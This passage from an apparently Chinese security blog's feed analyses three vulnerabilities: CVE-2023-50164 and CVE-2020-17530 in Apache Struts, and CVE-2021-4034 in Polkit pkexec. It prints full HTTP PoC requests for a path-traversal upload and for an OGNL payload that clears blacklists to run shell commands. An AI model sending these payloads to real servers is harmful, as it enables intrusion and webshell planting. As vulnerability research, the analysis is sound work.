style="display:flex;"><span><span style="color:#66d9ef">char</span> second<span style="color:#f92672">=</span> propertyName.<span style="color:#a6e22e">charAt</span>(1);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (Character.<span style="color:#a6e22e">isLowerCase</span>(first)<span style="color:#f92672">&amp;&amp;</span> Character.<span style="color:#a6e22e">isUpperCase</span>(second)) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> propertyName;</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span><span style="color:#f92672">[]</span> chars<span style="color:#f92672">=</span> propertyName.<span style="color:#a6e22e">toCharArray</span>();</span></span><span style="display:flex;"><span> chars<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span><span style="color:#f92672">=</span> Character.<span style="color:#a6e22e">toUpperCase</span>(chars<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">new</span> String(chars);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>忽略前面的if，在最后一个else中，如果第一个字符是小写，第二个字符是大写则会直接返回，否则会将第一个字符变为大写，所以<code>uploadFileName</code>在经过处理后会变为<code>UploadFileName</code>，所以在后面可以通过<code>addIfAccessor</code>里面的判断，获取到<code>setUploadFileName</code>方法。</p><p>也就是说会调用两次<code>setUploadFileName</code>方法，而Map中大写的key排在小写的key前面，所以首先会获取到经过目录穿越过滤器过滤的的正确的UploadFileName并通过<code>setUploadFileName</code>方法设置到action中的<code>UploadFileName</code>属性中<img alt="" src="/images/vulnerability/CVE-2023-50164-Apache-Struts-RCE.zh-cn.assets/14.png"/></p><p>而后会设置uploadFileName的参数，而该参数不会经过目录穿越过滤器，也就是这个属性可以通过<code>../</code>进行目录穿越，而后再次调用<code>setUploadFileName</code>方法action中的UploadFileName属性中，完成了变量覆盖。</p><p>PoC</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /upload.action<span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span></span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span><span style="color:#ae81ff">127.0.0.1</span></span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span><span style="color:#ae81ff">*/*</span></span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span><span style="color:#ae81ff">gzip, deflate</span></span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span><span style="color:#ae81ff">400</span></span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span><span style="color:#ae81ff">multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span><span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name="Upload"; filename="1.txt"</span></span><span style="display:flex;"><span>Content-Type: text/plain</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>1aaa</span></span><span style="display:flex;"><span>--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name="uploadFileName";</span></span><span style="display:flex;"><span>Content-Type: text/plain</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>../123.jsp</span></span><span style="display:flex;"><span>--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span></span></code></pre></div><h3 id="小结">小结</h3><p>这个漏洞巧妙地利用了struts中对属性的规范化和Map存储顺序，利用参数绑定巧妙地绕过了目录穿越的过滤，成功进行变量覆盖，从而进行目录穿越，可以利用目录穿越在敏感目录写入webshell，达成远程代码执行。</p><p>而在补丁中在使用appendAll之前会调用remove方法，remove方法会忽略大小写，如果存在相同的参数则移除之前，所以当使用小写方式尝试利用时，在appendAll方法内会先移除存在的uploadFileName项，从而避免了后续的变量覆盖。<img alt="" src="/images/vulnerability/CVE-2023-50164-Apache-Struts-RCE.zh-cn.assets/15.png"/></p><p><strong>参考链接</strong></p><blockquote><p><a href="https://trganda.github.io/notes/security/vulnerabilities/apache-struts/Apache-Struts-Remote-Code-Execution-Vulnerability-%28-S2-066-CVE-2023-50164%29" target="_blank">https://trganda.github.io/notes/security/vulnerabilities/apache-struts/Apache-Struts-Remote-Code-Execution-Vulnerability-(-S2-066-CVE-2023-50164)</a></p><p><a href="https://y4tacker.github.io/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/" target="_blank">https://y4tacker.github.io/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/</a></p></blockquote><p><strong>Created at 2023-12-12T11:18:52+08:00</strong></p></description></item><item><title>CVE-2023-21746 Windows NTLM Privilege Escalation</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-21746-windows-ntlm-privilege-escalation/</link><pubDate>Mon, 11 Dec 2023 16:02:36 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-21746-windows-ntlm-privilege-escalation/</guid><description><p><strong>Created at 2023-12-11T16:02:36+08:00</strong></p></description></item><item><title>CVE-2020-17530 Apache Struts OGNL RCE分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2020-17530-apache-struts-ognl-rce/</link><pubDate>Mon, 04 Dec 2023 19:21:08 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2020-17530-apache-struts-ognl-rce/</guid><description><h3 id="基本信息">基本信息</h3><p>Struts2 会对某些标签属性(比如<code>id</code>，其他属性有待寻找) 的属性值进行二次表达式解析，因此当这些标签属性中使用了<code>%{x}</code> 且<code>x</code> 的值用户可控时，用户再传入一个<code>%{payload}</code> 即可造成OGNL表达式执行。S2-061是对S2-059沙盒进行的绕过。</p><h3 id="影响版本">影响版本</h3><pre tabindex="0"><code>struts 2.0.0 - struts 2.5.25</code></pre><h3 id="环境搭建">环境搭建</h3><p>使用docker compose启动容器，在docker-compose.yml中加入如下：</p><pre tabindex="0"><code>-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005</code></pre><p>而后使用IDEA开启远程调试，对于JAVA8，需要去除address的<code>*:</code></p><h3 id="技术分析调试">技术分析&amp;调试</h3><h4 id="静态分析">静态分析</h4><p>首先分析PoC，观察PoC可以知道，PoC通过表达式声明了<code>instancemanager</code>变量，类型为<code>org.apache.tomcat.InstanceManager</code>，而后通过<code>instancemanager.newInstance</code>实例化<code>org.apache.commons.collections.BeanMap</code>对象，并通过bean.setBean方法将<code>com.opensymphony.xwork2.util.ValueStack.ValueStack</code>设置到bean中。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /index.action<span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span></span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span><span style="color:#ae81ff">192.168.59.211:8080</span></span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span><span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0</span></span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span><span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span><span style="color:#ae81ff">zh-CN,en-US;q=0.7,en;q=0.3</span></span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span><span style="color:#ae81ff">gzip, deflate</span></span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span><span style="color:#ae81ff">http://192.168.59.211:8080/.action;jsessionid=node010obz75lhtwqg1daa8msd7zvl70.node0</span></span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span><span style="color:#ae81ff">close</span></span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span><span style="color:#ae81ff">i_like_gitea=94b6fe5fe1049e19; lang=zh-CN; redirect_to=%2F; JSESSIONID=node014s7soaddt6u41im2x0qfyngjk1.node0</span></span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span><span style="color:#ae81ff">1</span></span></span><span style="display:flex;"><span>Pragma<span style="color:#f92672">:</span><span style="color:#ae81ff">no-cache</span></span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span><span style="color:#ae81ff">no-cache</span></span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span><span style="color:#ae81ff">multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF</span></span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span><span style="color:#ae81ff">827</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>------WebKitFormBoundaryl7d1B1aGsV2wcZwF</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name="id"</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("id")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}</span></span><span style="display:flex;"><span>------WebKitFormBoundaryl7d1B1aGsV2wcZwF--</span></span></code></pre></div><p><code>com.opensymphony.xwork2.util.ValueStack.ValueStack</code>中存储了当前请求相关的一些对象，如下图解释，来自<a href="https://www.cnblogs.com/xtdxs/p/6527380.html" target="_blank">https://www.cnblogs.com/xtdxs/p/6527380.html</a><img alt="" src="/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/4.png"/></p><p>而后分别通过<code>bean.setBean</code>和<code>bean.get</code>获取到了对象获取到了<code>com.opensymphony.xwork2.util.ValueStack.ValueStack.context</code>，实际上就是下面这个对象</p><p><img alt="" src="/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/3.png"/></p><p>继续通过以上方式使用<code>bean.get</code>获取<code>SecurityMemberAccess</code>对象，而后通过bean.put方法设置<code>SecurityMemberAccess.excludedPackageNames</code>和<code>SecurityMemberAccess.excludedClasses</code>为空。</p><p>最后通过<code>freemarker.template.utility.Execute.exec</code>执行Shell 命令。</p><p>整体来看，该漏洞利用思路是通过Bean的get/set方法间接获取到OgnlContext，而后通过OgnlContext获取到SecurityMemberAccess对象并把里面的黑名单置空，最后调用黑名单中的<code>freemarker.template.utility.Execute.exec</code>执行命令。</p><h4 id="动态调试">动态调试</h4><p>使用docker启动环境后，拷贝里面的关键jar包，新建IDEA项目，导入jar包，开启远程调试。</p><p>在<code>org.apache.commons.collections.BeanMap</code>构造函数下断点，运行PoC，IDEA断下，可以看到有如下</p><p><img alt="" src="/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/1.png"/></p><p>调用栈如下：</p><p><img alt="" src="/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/2.png"/></p><p>在<code>compileAndExecute:523, OgnlUtil (com.opensymphony.xwork2.ognl)</code>中看到传入的payload已经被解析为了AST链。<img alt="" src="/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/5.png"/></p><p>而后在<code>getValueBody:141, ASTChain (ognl) [1]</code>通过循环，遍历处理</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> Object<span style="color:#a6e22e">getValueBody</span>(OgnlContext context, Object source)<span style="color:#66d9ef">throws</span> OgnlException {</span></span><span style="display:flex;"><span> Object result<span style="color:#f92672">=</span> source;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span> 0;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> ilast<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_children</span>.<span style="color:#a6e22e">length</span><span style="color:#f92672">-</span> 1; i<span style="color:#f92672">&lt;=</span> ilast;<span style="color:#f92672">++</span>i) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">boolean</span> handled<span style="color:#f92672">=</span><span style="color:#66d9ef">false</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (i<span style="color:#f92672">&lt;</span> ilast<span style="color:#f92672">&amp;&amp;</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_children</span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span><span style="color:#66d9ef">instanceof</span> ASTProperty) {</span></span><span style="display:flex;"><span> ASTProperty propertyNode<span style="color:#f92672">=</span> (ASTProperty)<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_children</span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> indexType<span style="color:#f92672">=</span> propertyNode.<span style="color:#a6e22e">getIndexedPropertyType</span>(context, result);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (indexType<span style="color:#f92672">!=</span> OgnlRuntime.<span style="color:#a6e22e">INDEXED_PROPERTY_NONE</span><span style="color:#f92672">&amp;&amp;</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_children</span><span style="color:#f92672">[</span>i<span style="color:#f92672">+</span> 1<span style="color:#f92672">]</span><span style="color:#66d9ef">instanceof</span> ASTProperty) {</span></span><span style="display:flex;"><span> ASTProperty indexNode<span style="color:#f92672">=</span> (ASTProperty)<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_children</span><span style="color:#f92672">[</span>i<span style="color:#f92672">+</span> 1<span style="color:#f92672">]</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (indexNode.<span style="color:#a6e22e">isIndexedAccess</span>()) {</span></span><span style="display:flex;"><span> Object index<span style="color:#f92672">=</span> indexNode.<span style="color:#a6e22e">getProperty</span>(context, result);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (index<span style="color:#66d9ef">instanceof</span> DynamicSubscript) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (indexType<span style="color:#f92672">==</span> OgnlRuntime.<span style="color:#a6e22e">INDEXED_PROPERTY_INT</span>) {</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (indexType<span style="color:#f92672">==</span> OgnlRuntime.<span style="color:#a6e22e">INDEXED_PROPERTY_OBJECT</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> OgnlException(<span style="color:#e6db74">"DynamicSubscript '"</span><span style="color:#f92672">+</span> indexNode<span style="color:#f92672">+</span><span style="color:#e6db74">"' not allowed for object indexed property '"</span><span style="color:#f92672">+</span> propertyNode<span style="color:#f92672">+</span><span style="color:#e6db74">"'"</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>handled) {</span></span><span style="display:flex;"><span> result<span style="color:#f92672">=</span> OgnlRuntime.<span style="color:#a6e22e">getIndexedProperty</span>(context, result, propertyNode.<span style="color:#a6e22e">getProperty</span>(context, result).<span style="color:#a6e22e">toString</span>(), index);</span></span><span style="display:flex;"><span> handled<span style="color:#f92672">=</span><span style="color:#66d9ef">true</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">++</span>i;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>handled) {</span></span><span style="display:flex;"><span> result<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_children</span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>.<span style="color:#a6e22e">getValue</span>(context, result);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> result;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p><img alt="" src="/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/6.png"/></p><p>继续运行，IDEA在<code>setBean:536, BeanMap (org.apache.commons.collections)</code>断下，此时通过setBean将context存到bean对象中<img alt="" src="/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/7.png"/></p><p>在initialise方法中会将PoC中传入的valueStack分为name和对应的get方法存储到HashMap中，可以看到context对应于<code>public java.util.Map com.opensymphony.xwork2.ognl.OgnlValueStack.getContext()</code></p><p><img alt="" src="/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/20.png"/></p><p>而后在通过bean.get获取到context，前面知道context对应于getContext方法，通过调用这个方法获取到了stack中的context。<img alt="" src="/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/8.png"/></p><p>再次通过bean.setBean存储到bean中<img alt="" src="/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/9.png"/></p><p>通过bean获取memverAccess，对应SecurityMemberAccess对象<img alt="" src="/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/10.png"/></p><p>可以看到在其中已有预先初始化的黑名单类和包名，其中包括后面执行命令使用的freemarker.template<img alt="" src="/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/11.png"/></p><p>在<code>com.opensymphony.xwork2.ognl.isAccessible</code>下断点，可以看到在每次执行Ognl表达式之前都会检查包名和类名是否在黑名单内<img alt="" src="/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/12.png"/></p><p>此时调用栈如下<img alt="" src="/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/13.png"/></p><p>而后通过bean.put将黑名单覆盖后，在使用<code>#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist)</code>时黑名单已经是空集了，直接通过了校验。</p><p><img alt="" src="/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/14.png"/></p><p>而后在<code>freemarker.template.utility.Execute.exec</code>方法中直接通过调用<code>Runtime.getRuntime().exec(aExecute)</code>执行系统命令。<img alt="" src="/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/15.png"/></p><p>Diff对比</p><p>在<a href="https://github.com/apache/struts/commit/0a75d8e8fa3e75d538fb0fcbc75473bdbff9209e" target="_blank">0a75d8e8fa3e75d538fb0fcbc75473bdbff9209e</a>对比可知当字符串中不包含表达式时才会添加<code>%{}</code><img alt="" src="/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/16.png"/></p><p>并且限制了解析tag时的不安全行为<img alt="" src="/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/17.png"/></p><p>同时将一些危险类加入黑名单中<a href="https://github.com/apache/struts/commit/482af41673a3883e904ea72391a5b4a03cbd5d94" target="_blank">https://github.com/apache/struts/commit/482af41673a3883e904ea72391a5b4a03cbd5d94</a><img alt="" src="/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/18.png"/></p><h3 id="小结">小结</h3><p>这个漏洞利用了OGNL表达式的二次解析，注入OGNL表达式，巧妙地利用tomcat容器中的Bean类获取OGNL context，并通过Bean类的get/setBean方法重置黑名单，而后利用黑名单中的类执行任意命令。</p><p><strong>参考链接</strong></p><blockquote><p><a href="https://www.anquanke.com/post/id/225252" target="_blank">https://www.anquanke.com/post/id/225252</a></p></blockquote><p><strong>Created at 2023-12-04T19:21:08+08:00</strong></p></description></item><item><title>CVE-2021-4034 Polkit 权限提升漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-4034-polkit-eop/</link><pubDate>Thu, 30 Nov 2023 14:25:08 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-4034-polkit-eop/</guid><description><h3 id="基本信息">基本信息</h3><p>Polkit是一个用于在类Unix操作系统中控制系统范围权限的组件，它为非特权进程与特权进程提供了一种通信方式。Polkit中的pkexec应用程序旨在允许非特权用户根据预定义的策略以特权用户身份运行命令。
Polkit pkexec存在本地权限提升漏洞。由于pkexec无法正确处理调用参数计数，攻击者可以通过制作环境变量来诱导pkexec执行任意代码。具有低权限的攻击者可以利用此漏洞绕过pkexec自带的安全保护措施，获取目标机器的ROOT权限。</p><h3 id="影响版本">影响版本</h3><pre tabindex="0"><code>Polkit默认安装在多个主流Linux系统上，由2009年5月发布的第一个版本引入，并影响后续所有版本。以下为CentOS及Ubuntu上的安全版本：
CentOS系列：
CentOS 6：polkit-0.96-11.el6_10.2
CentOS 7：polkit-0.112-26.el7_9.1
CentOS 8.0：polkit-0.115-13.el8_5.1
CentOS 8.2：polkit-0.115-11.el8_2.2
CentOS 8.4：polkit-0.115-11.el8_4.2
Ubuntu系列：
Ubuntu 20.04 LTS：policykit-1-0.105-26ubuntu1.2
Ubuntu 18.04 LTS：policykit-1-0.105-20ubuntu0.18.04.6
Ubuntu 16.04 ESM：policykit-1-0.105-14.1ubuntu0.5+esm1
Ubuntu 14.04 ESM：policykit-1-0.105-4ubuntu3.14.04.6+esm1</code></pre><h3 id="环境搭建">环境搭建</h3><h3 id="技术分析调试">技术分析&amp;调试</h3><p>在<a href="https://gitlab.freedesktop.org/polkit/polkit/-/blob/0.120/src/programs/pkexec.c" target="_blank">源码</a>中可以看到如下：n被赋值为1，而后通过g_strdup函数在堆内分配内存并将<code>argv[n]</code>复制进去，将分配到内存地址返回给path变量。当不加任何参数时，argv数组只有一个元素，而<code>argv[1]</code>实际指向<code>envp[0]</code>，也就是会把环境变量的第一个复制给path变量</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (n<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>; n<span style="color:#f92672">&lt;</span> (guint) argc; n<span style="color:#f92672">++</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span> (argv[n],<span style="color:#e6db74">"--help"</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> opt_show_help<span style="color:#f92672">=</span> TRUE;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span> (argv[n],<span style="color:#e6db74">"--version"</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> opt_show_version<span style="color:#f92672">=</span> TRUE;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span> (argv[n],<span style="color:#e6db74">"--user"</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span><span style="color:#a6e22e">strcmp</span> (argv[n],<span style="color:#e6db74">"-u"</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span>.....</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">g_printerr</span> (<span style="color:#e6db74">"--user specified twice</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> out;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> opt_user<span style="color:#f92672">=</span><span style="color:#a6e22e">g_strdup</span> (argv[n]);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span> (argv[n],<span style="color:#e6db74">"--disable-internal-agent"</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>)</span></span><span style="display:flex;"><span>.....</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>.....</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">/* Now figure out the command-line to run - argv is guaranteed to be NULL-terminated, see</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * http://lkml.indiana.edu/hypermail/linux/kernel/0409.2/0287.html</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * but do check this is the case.</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * We also try to locate the program in the path if a non-absolute path is given.</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">g_assert</span> (argv[argc]<span style="color:#f92672">==</span> NULL);</span></span><span style="display:flex;"><span> path<span style="color:#f92672">=</span><span style="color:#a6e22e">g_strdup</span> (argv[n]);</span></span></code></pre></div><p>而后如果<code>envp[0]!='/'</code>则会通过<code>g_find_program_in_path</code>在PATH环境变量内的目录中寻找第一个名字为path变量的可执行文件，并分配内存存储其绝对路径，没找到则会返回NULL。
再找到之后会将其写入到<code>argv[n]</code>，前面说过当没有传入命令行参数时，n为1<code>argv[1]</code>指向<code>envp[0]</code>，也就是我们可以通过控制执行pkexec的环境变量，在pkexec执行时注入环境变量。</p><pre tabindex="0"><code> if (path[0] != '/')
{
/* g_find_program_in_path() is not suspectible to attacks via the environment */
s = g_find_program_in_path (path);
if (s == NULL)
{
g_printerr ("Cannot run program %s: %s\n", path, strerror (ENOENT));
goto out;
}
g_free (path);
argv[n] = path = s;
}</code></pre><p>那为什么要绕这么大一圈来注入环境变量呢，直接在execve时通过envp参数注入呗。
在<a href="https://codebrowser.dev/glibc/glibc/elf/dl-support.c.html" target="_blank">glibc.so实现</a>中有如下代码：循环遍历unsecure_envvars，并且尝试调用unsetenv来取消该环境变量(如果有的话)。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (__libc_enable_secure)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">const</span><span style="color:#66d9ef">char</span> unsecure_envvars[]<span style="color:#f92672">=</span></span></span><span style="display:flex;"><span> UNSECURE_ENVVARS</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef EXTRA_UNSECURE_ENVVARS</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> EXTRA_UNSECURE_ENVVARS</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> ;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>cp<span style="color:#f92672">=</span> unsecure_envvars;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (cp<span style="color:#f92672">&lt;</span> unsecure_envvars<span style="color:#f92672">+</span><span style="color:#66d9ef">sizeof</span> (unsecure_envvars))</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__unsetenv</span> (cp);</span></span><span style="display:flex;"><span> cp<span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span><span 